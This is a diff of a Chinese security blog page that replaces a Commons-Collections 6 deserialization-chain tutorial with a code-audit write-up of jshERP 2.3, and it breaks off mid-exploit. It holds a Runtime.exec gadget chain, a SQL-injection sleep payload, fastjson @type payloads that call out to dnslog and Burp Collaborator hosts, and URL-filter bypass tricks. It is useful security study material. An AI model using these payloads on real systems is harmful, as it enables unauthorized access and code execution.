@@ -9,7 +9,7 @@
     
     <title>
         
-            Java_Commons-Collections 6 学习过程 |
+            JAVA代码审计 华夏ERP |
         
         Nbc&#39;s Blog
     </title>
@@ -262,7 +262,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        Java_Commons-Collections 6 学习过程
+                        JAVA代码审计 华夏ERP
                     </div>
                 
 
@@ -290,13 +290,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-star"></i>&nbsp;
-                <span class="datetime">2026-03-02 14:23:07</span>
+                <span class="datetime">2026-03-02 17:00:53</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon Mar 02 2026 17:08:30 GMT+0800">2026-03-02 17:08:30</span>
+                    <span class="datetime" data-updated="Mon Mar 02 2026 17:09:56 GMT+0800">2026-03-02 17:09:56</span>
                 </span>
             
         
@@ -305,7 +305,7 @@
             <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                 <ul class="post-category-ul">
                     
-                            <li class="category-item"><a href="/categories/CC%E9%93%BE/">CC链</a></li>
+                            <li class="category-item"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
                         
                     
                 </ul>
@@ -326,12 +326,12 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>1k 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.6k 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>4 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>5 分钟</span>
             </span>
         
         
@@ -353,141 +353,350 @@
                     
 
                     
-                         <p>CC6被称为是最好用的CC利用链，因为CC6不限制jdk版本，只要commons collections 小于等于3.2.1，都存在这个漏洞。</p>
-<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
-<li>Jdk 8u71</li>
-<li>Comoons-Collections 3.2.1</li>
-</ul>
-<h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><p>CC6前半段链子和LazyMap版的<a class="link"   target="_blank" rel="noopener" href="https://blog.nbcares.top/archives/CC1#heading-17" >CC1<i class="fas fa-external-link-alt"></i></a>是一样的，<code>LazyMap</code> 类到 <code>InvokerTransformer</code> 类是一样的，我们直接到 <code>LazyMap</code> 下从找<code>get</code>方法开始</p>
-<h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><p>CC6运用到的主要类就是这个<code>TiedMapEntry</code> 类中的 <code>getValue()</code> 方法</p>
+                         <h1 id="JAVA代码审计-华夏ERP"><a href="#JAVA代码审计-华夏ERP" class="headerlink" title="JAVA代码审计 华夏ERP"></a>JAVA代码审计 华夏ERP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早就写的一篇文章，只是因为处于迷茫期很多积攒的没有发。而且感觉搭在服务器上不如搭在github上，等这回服务器到期了就换个地方。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>审的是这个版本的<a class="link"   target="_blank" rel="noopener" href="https://github.com/jishenghua/jshERP/releases/tag/2.3" >华夏ERP2.3<i class="fas fa-external-link-alt"></i></a> 现在改名叫jsherp了，虽然版本老但是不妨碍成为学习审计代码的一个好例子</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406173509306.png"
-                        alt="image-20240406173509306"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229111847411.png"
+                        alt="image-20241229111847411"
                  ></p>
-<p>而这个map是TiedMapEntry构造函数的参数可控</p>
+<p>将sql导入后，配置一下相关文件就可以了</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406173553987.png"
-                        alt="image-20240406173553987"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229112205160.png"
+                        alt="image-20241229112205160"
                  ></p>
-<p>至此我们编写一下Exp试试这个TiedMapEntry是否可行</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;nbc&quot;</span>);</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="审计准备"><a href="#审计准备" class="headerlink" title="审计准备"></a>审计准备</h3><h4 id="看readme"><a href="#看readme" class="headerlink" title="看readme"></a>看readme</h4><p>能让自己对这个项目有个大概的了解，构造出一个前期审计代码的大致侧重点。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229115256964.png"
+                        alt="image-20241229115256964"
+                 ></p>
+<p>侧重点：审sql注入时就要注意$符号了，并且可能存在log4j漏洞</p>
+<h4 id="看pom"><a href="#看pom" class="headerlink" title="看pom"></a>看pom</h4><p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229115635170.png"
+                        alt="image-20241229115635170"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250103215926828.png"
+                        alt="image-20250103215926828"
+                 ></p>
+<p>有可能存在fastjson的漏洞但是并没有引入log4j-core所以不存在log4j的漏洞</p>
+<h4 id="看filter"><a href="#看filter" class="headerlink" title="看filter"></a>看filter</h4><p>学习filter内存马的时候就了解过filter了</p>
+<p>直接到doFilter那里</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229121609814.png"
+                        alt="image-20241229121609814"
+                 ></p>
+<p>主要对四个内容处理</p>
+<p>是否登录</p>
+<p>放行register.html，login.html，doc.html这些的业务</p>
+<p>放行自己允许的一些页面，这个在初始化时候有定义通过#分割</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229122110059.png"
+                        alt="image-20241229122110059"
+                 ></p>
+<p>但是我们发现</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229122453224.png"
+                        alt="image-20241229122453224"
+                 ></p>
+<p>他对这个放行的页面处理似乎有些问题，用的是<code>startsWith()</code>对URL进行判断是否是白名单的那些，那么就可以通过目录穿越来未授权访问其他页面了，等会在测试的时候留意一下这里。</p>
+<h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>先去找我们刚才留下的疑惑点入手。</p>
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>因为用的是mybatis,所以直接在mapper里搜索<code>$</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102202943650.png"
+                        alt="image-20250102202943650"
+                 ></p>
+<p>发现很多都是用的$来编写的sql语句，所以我们可以换种思路，搜索容易出现sql注入的关键字比如’like’。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102203045148.png"
+                        alt="image-20250102203045148"
+                 ></p>
+<p>找到对应的<code>MapperEx</code>文件（<code>MapperEx</code>文件一般用来封装复杂sql语句与主 <code>Mapper</code> 分离，避免 <code>Mapper</code> 变得臃肿）</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102203119236.png"
+                        alt="image-20250102203119236"
+                 ></p>
+<p>再找到对应的Service</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102203134694.png"
+                        alt="image-20250102203134694"
+                 ></p>
+<p>一直可以往上找一般我的思路就是mapper-&gt;service-&gt;controll</p>
+<p>发现最后到了<code>ResourceController</code>不应该是<code>RoleController</code>么，接下来就是黑白盒结合去探究了（其实这里如果是开发经验够足的化肯定就懂了，后面查阅一下ResourceController的作用）</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102203310849.png"
+                        alt="image-20250102203310849"
+                 ></p>
+<p>在<code>RoleService</code>这里打断点调试</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102203830189.png"
+                        alt="image-20250102203830189"
+                 ></p>
+<p>很明显后台有个角色管理这会走到这里</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102203901361.png"
+                        alt="image-20250102203901361"
+                 ></p>
+<p>隐约就可以才到那个角色名称应该就是name参数了，抓个包看看</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102204146758.png"
+                        alt="image-20250102204146758"
+                 ></p>
+<p>看后台断点</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102204232056.png"
+                        alt="image-20250102204232056"
+                 ></p>
+<p>可以看到确实如我们推断</p>
+<p>尝试进行语句拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;aaa&#x27; or sleep(3)-- =&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>url编码一下</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102204812022.png"
+                        alt="image-20250102204812022"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102204835144.png"
+                        alt="image-20250102204835144"
+                 ></p>
+<p>发现执行成功</p>
+<p>后台也能看到记录</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102205251592.png"
+                        alt="image-20250102205251592"
+                 ></p>
+<p>查倒是不好查，直接by GPT了</p>
+<blockquote>
+<p><code>ResourceController</code> 的主要作用包括：</p>
+<ol>
+<li>管理和分发静态资源。</li>
+<li>处理与资源相关的 RESTful API 操作。</li>
+<li>作为资源代理，为客户端提供统一的资源访问接口。</li>
+<li>实现资源访问的权限控制和安全性。</li>
+</ol>
+</blockquote>
+<p>简显易懂，那其实很多语句只要参数可控都可以类似这个流程sql注入了，像like基本就是搜索功能了，其他的内容有兴趣可以自行探索。</p>
+<h4 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h4><p>刚才我们在看pom的时候发现用的fastjson版本是存在漏洞的，现在全局搜索以parseObject</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104202200594.png"
+                        alt="image-20250104202200594"
+                 ></p>
+<p>先找这种没有限定类的，然后去测试参数是否可控</p>
+<p>有兴趣的师傅可以多去尝试几个，有练习意义</p>
+<h5 id="半场开香槟版"><a href="#半场开香槟版" class="headerlink" title="半场开香槟版"></a>半场开香槟版</h5><p>这里就写一下其中一个测试的</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104203048486.png"
+                        alt="image-20250104203048486"
+                 ></p>
+<p>跟踪一下这个</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104203222112.png"
+                        alt="image-20250104203222112"
+                 ></p>
+<p>推测应该是商品的添加功能，也可以去数据库看看数据，我的方法是这样定位的</p>
+<p>这里</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104204450949.png"
+                        alt="image-20250104204450949"
+                 ></p>
+<p>添加到forward到这个包</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104204545269.png"
+                        alt="image-20250104204545269"
+                 ></p>
+<p>看到了javabean的数据</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104205705590.png"
+                        alt="image-20250104205705590"
+                 ></p>
+<p>看到这里的时候都要半场开香槟了</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104205907045.png"
+                        alt="image-20250104205907045"
+                 ></p>
+<p>构成payload看看检测一下先,放一下很多<a class="link"   target="_blank" rel="noopener" href="https://github.com/Nbccccc/Fastjson-Payload" >Nbccccc&#x2F;Fastjson-Payload: Fastjson姿势技巧集合<i class="fas fa-external-link-alt"></i></a>fork这位师傅的<a class="link"   target="_blank" rel="noopener" href="https://github.com/safe6Sec/Fastjson" >safe6Sec&#x2F;Fastjson: Fastjson姿势技巧集合<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://n9z7x6.dnslog.cn&quot;&#125;&#125;&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是并没有发生期待的结果，显示很骨感</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104210717930.png"
+                        alt="image-20250104210717930"
+                 ></p>
+<p>发现上面还有个<code>JSONObject.parseObject(beanJson, Material.class)</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104210845064.png"
+                        alt="image-20250104210845064"
+                 ></p>
+<p>当然是加载不了的腻，看了眼Material也没有什么能用的getter、setter方法所以就寄掉了，最开始没注意上面，被上面截胡了。删到那一行就可以了，当然不可能开发出来让你打的oopz。</p>
+<p>但是有一说一试了一下这里fastjson版本要是低一点就可以打了，有兴趣的师傅可以试一下</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250105220636152.png"
+                        alt="image-20250105220636152"
+                 ></p>
+<p>言知之易，行之难 多找找没准就又发现什么了呢xixi</p>
+<h5 id="成功版"><a href="#成功版" class="headerlink" title="成功版"></a>成功版</h5><p>找到JSONObject.parseObject(search)</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104214359109.png"
+                        alt="image-20250104214359109"
+                 ></p>
+<p>看到就直接恍然大悟，这个erp也调试到这里了，search这个参数经常在包里见到，直接白盒结合黑盒，去前面随便搜索一下到这个search参数。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104214703205.png"
+                        alt="image-20250104214703205"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104214721214.png"
+                        alt="image-20250104214721214"
+                 ></p>
+<p>直接上payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://h1jqa9iuj1mc266l0hei9kfnye45su.burpcollaborator.net&quot;&#125;&#125;&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406173746149.png"
-                        alt="image-20240406173746149"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104215525842.png"
+                        alt="image-20250104215525842"
                  ></p>
-<h3 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h3><p>然后就是继续往后找了，看看谁调用了<code>getValue</code>方法，正好就在这个类里有个<code>hashCode</code>方法中调用了getValue</p>
+<p>成功</p>
+<p>想要rce需要开启一下<code>autoTypeSupport</code>(<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>)，或者<code>Feature.SupportNonPublicField</code>参数等</p>
+<h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>这里就算filter里对访问目录控制的部分了，分为ignoredUrls，allowUrls</p>
+<h5 id="ignoredUrls"><a href="#ignoredUrls" class="headerlink" title="ignoredUrls"></a>ignoredUrls</h5><p>首先经过的ignoredUrls的处理，这里自定义一个<code>verify</code>函数来处理</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406173946981.png"
-                        alt="image-20240406173946981"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220170651734.png"
+                        alt="image-20250220170651734"
                  ></p>
-<p>看到<code>hashCode</code>这个方法就很熟悉了，就是<code>urldns</code>中的那个链子，在<code>readObject</code>中有个<code>putVal</code>里面有个<code>hash(key)</code>中自动调用<code>key.hashCode()</code></p>
+<p>会将读取的url拼接匹配符例如<code>^.*regex.*$</code>只要存在regex就返回true</p>
+<p>那很明显我们只要让读取的url里存在ignoredLists里的内容，并且访问的是我们指定的url就行了</p>
+<p>那如何构造呢，这里我想到了有时候可以看到访问的url为xxx.com&#x2F;xxx;jsession&#x3D;xxx</p>
+<p>;后面会被容器处理掉的</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406174517195.png"
-                        alt="image-20240406174517195"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220171408588.png"
+                        alt="image-20250220171408588"
                  ></p>
+<h5 id="allowUrls"><a href="#allowUrls" class="headerlink" title="allowUrls"></a>allowUrls</h5><p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220171527036.png"
+                        alt="image-20250220171527036"
+                 ></p>
+<p>这里则是以allowUrls开头就允许访问</p>
+<p>把获取的url打印出来是这样的</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406174526711.png"
-                        alt="image-20240406174526711"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220171440081.png"
+                        alt="image-20250220171440081"
                  ></p>
-<p><code>key</code>可以通过<code>HashMap.put()</code>设置</p>
-<p>但是发现<code>HashMap.put()</code>本身就会调用一次<code>hash()</code></p>
+<p>那我们就可以这样了</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406175027590.png"
-                        alt="image-20240406175027590"
-                 ></p>
-<p>这就会导致命令提前触发，导致反序列化的时候就不触发了</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406175138426.png"
-                        alt="image-20240406175138426"
-                 ></p>
-<p>这里的解决方案是在<code>put</code>前将<code>LazyMap</code>的<code>factory</code>属性改为个随便的数据，然后再put之后再通过反射改回来，因为是protected属性</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406180111988.png"
-                        alt="image-20240406180111988"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406180017315.png"
-                        alt="image-20240406180017315"
-                 ></p>
-<p>使其不触发</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406180537584.png"
-                        alt="image-20240406180537584"
-                 ></p>
-<p>再通过反射改回来</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">lazyMapClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">factoryField.set(lazyMap, chainedTransformer);</span><br></pre></td></tr></table></figure>
-
-<h4 id="tnnd为什么不弹"><a href="#tnnd为什么不弹" class="headerlink" title="tnnd为什么不弹"></a>tnnd为什么不弹</h4><p>但是发现怎么不弹计算器</p>
-<p>在<code>LazyMap</code>中的<code>get()</code>方法处下个断点我们可以发现再反序列化的时候跳到这个地点时那个if判断是进不去的因为<code>map.containsKey(key)</code>是true</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406181701033.png"
-                        alt="image-20240406181701033"
-                 ></p>
-<p>这是因为<code>get</code>方法中存在<code>map.put(key, value)</code></p>
-<p>序列化前如果<code>map</code>没包含这个<code>key</code>，那么就给map传入这个键值对。</p>
-<p>这样就会导致反序列化时map里已经存在这个key了，所以不会执行<code>factory.transform(key)</code>，从而导致无法命令执行。</p>
-<p>所以我们把这个<code>key</code>在<code>put</code>后给删了就行</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406181811518.png"
-                        alt="image-20240406181811518"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220171643455.png"
+                        alt="image-20250220171643455"
                  ></p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406181853594.png"
-                        alt="image-20240406181853594"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220171652148.png"
+                        alt="image-20250220171652148"
                  ></p>
-<h2 id="最终Exp"><a href="#最终Exp" class="headerlink" title="最终Exp"></a>最终Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = 